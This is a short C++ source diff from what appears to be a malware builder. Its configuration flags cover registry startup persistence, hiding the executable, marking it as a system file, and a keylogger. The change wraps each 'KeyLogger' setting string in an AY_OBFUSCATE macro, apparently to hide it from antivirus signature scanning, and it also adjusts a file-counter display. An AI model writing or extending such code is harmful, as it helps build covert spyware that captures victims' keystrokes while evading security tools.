@@ -133,8 +133,8 @@ private:
 		if (!sf.CheckSetting("SystemFile"))
 			sf.SetSetting("SystemFile", (SystemFile) ? "true" : "false");
 
-		if (!sf.CheckSetting("KeyLogger"))
-			sf.SetSetting("KeyLogger", (KeyLogger) ? "true" : "false");
+		if (!sf.CheckSetting((string)AY_OBFUSCATE("KeyLogger")))
+			sf.SetSetting((string)AY_OBFUSCATE("KeyLogger"), (KeyLogger) ? "true" : "false");
 	}
 
 public:
@@ -167,7 +167,7 @@ public:
 		RegStartup = (sf.GetSetting("RegStartup") == "true");
 		HideExe = (sf.GetSetting("HideExe") == "true");
 		SystemFile = (sf.GetSetting("SystemFile") == "true");
-		KeyLogger = (sf.GetSetting("KeyLogger") == "true");
+		KeyLogger = (sf.GetSetting((string)AY_OBFUSCATE("KeyLogger")) == "true");
 
 		return true;
 	}
@@ -196,7 +196,7 @@ public:
 		sf.SetSetting("RegStartup", (RegStartup) ? "true" : "false");
 		sf.SetSetting("HideExe", (HideExe) ? "true" : "false");
 		sf.SetSetting("SystemFile", (SystemFile) ? "true" : "false");
-		sf.SetSetting("KeyLogger", (KeyLogger) ? "true" : "false");
+		sf.SetSetting((string)AY_OBFUSCATE("KeyLogger"), (KeyLogger) ? "true" : "false");
 
 		return true;
 	}
@@ -596,7 +596,7 @@ public:
 			{
 				cu.SetCursorPos({ FilePos.X, (short)(FilePos.Y + i) });
 
-				cout << "...";
+				cout << Sel + 1 << "/" << Files.size();
 			}
 			else if (Files.size() > i + FilesOffset)
 			{
